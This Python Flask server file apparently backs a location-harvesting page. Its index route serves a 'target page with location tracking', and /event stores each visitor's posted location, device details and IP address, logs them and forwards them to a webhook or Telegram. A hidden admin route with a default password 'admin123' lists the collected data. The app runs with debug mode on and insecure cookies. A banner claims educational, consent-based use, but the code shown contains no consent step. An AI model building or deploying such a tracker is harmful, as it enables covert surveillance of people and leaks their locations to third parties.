from flask import Flask, render_template, request, jsonify, Response, redirect, url_for, session
from werkzeug.middleware.proxy_fix import ProxyFix
import logging
from logging.handlers import RotatingFileHandler
import os
from collections import deque
import json
from datetime import datetime, timedelta

# Load environment variables from .env file if it exists
try:
    from dotenv import load_dotenv
    load_dotenv()
except (ImportError, ModuleNotFoundError):
    # python-dotenv not installed, skip loading .env file
    pass

from config import init_config
from utils.ua import parse_user_agent
from utils.webhook import forward_event

# Initialize Flask app
app = Flask(__name__)

# Security configuration
app.secret_key = os.getenv('SECRET_KEY', os.urandom(32).hex())
app.permanent_session_lifetime = timedelta(hours=12)  # Session lasts 12 hours
app.config['SESSION_COOKIE_SECURE'] = False  # Set to True in production with HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['WTF_CSRF_TIME_LIMIT'] = None  # Disable CSRF time limit for development

# Proxy configuration
app.wsgi_app = ProxyFix(app.wsgi_app)

# Application configuration
config = init_config()

# Map routes without authentication

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]',
    handlers=[
        logging.StreamHandler()  # Log to console instead of file for development
    ]
)
logger = logging.getLogger(__name__)

# In-memory event storage
events: deque = deque(maxlen=1000)

# HTTPS redirect disabled for development
# @app.before_request
# def force_https():
#     """Force HTTPS redirect unless debug_http is enabled"""
#     if not config['DEBUG_HTTP'] and request.headers.get('X-Forwarded-Proto', 'http') == 'http':
#         url = request.url.replace('http://', 'https://', 1)
#         return redirect(url), 301

@app.route('/')
def index():
    """Serve the target page with location tracking"""
    return render_template('default/index.html')


# Simple password authentication for admin dashboard
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin123')
if ADMIN_PASSWORD == 'admin123':
    logger.warning("Using default admin password! Please set ADMIN_PASSWORD environment variable.")

@app.route('/admin_893b4de8f1', methods=['GET', 'POST'])
def admin_dashboard():
    """Serve the admin dashboard with password protection"""
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session.clear()  # Clear any old session data
            session['admin_authenticated'] = True
            session.permanent = True  # Make session last longer
            return redirect(url_for('admin_dashboard'))
        return render_template('admin/login.html', error='Invalid password')
    
    if not session.get('admin_authenticated'):
        return render_template('admin/login.html')
    
    return render_template('admin/dashboard.html')

@app.route('/event', methods=['POST'])
def receive_event():
    """Handle incoming location events"""
    event_data = request.get_json()
    
    # Add server-side data
    event_data['timestamp'] = datetime.utcnow().isoformat()
    event_data['ip'] = request.remote_addr
    
    if 'device' in event_data and 'ua' in event_data['device']:
        event_data['device'].update(parse_user_agent(event_data['device']['ua']))
    
    # Store event
    events.append(event_data)
    logger.info(f"Received event: {json.dumps(event_data)}")
    
    # Forward event if configured
    forward_event(
        event_data,
        webhook_url=config.get('WEBHOOK_URL'),
        telegram_config=config.get('TELEGRAM_CONFIG')
    )
    
    return jsonify({'status': 'ok'})

@app.route('/get_all_locations')
def get_all_locations():
    """Return all events for dashboard"""
    if not session.get('admin_authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
        
    event_list = sorted(
        list(events),
        key=lambda x: x['timestamp'],
        reverse=True
    )
    logger.info(f"Getting all locations. Number of events: {len(event_list)}")
    return jsonify(event_list)

@app.route('/healthz')
def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'ok'})

@app.route('/robots.txt')
def robots_txt():
    """Serve robots.txt for SEO"""
    return app.send_static_file('robots.txt')

@app.route('/sitemap.xml')
def sitemap_xml():
    """Serve sitemap.xml for SEO"""
    return app.send_static_file('sitemap.xml')

if __name__ == '__main__':
    print("=" * 80)
    print("EDUCATIONAL PURPOSES ONLY - Consent-Based Location Collection Demo")
    print("=" * 80)
    
    app.run(
        host='0.0.0.0',
        port=config['PORT'],
        debug=True,  # Enable debug mode for development
        ssl_context=None  # Disable SSL for development
    )
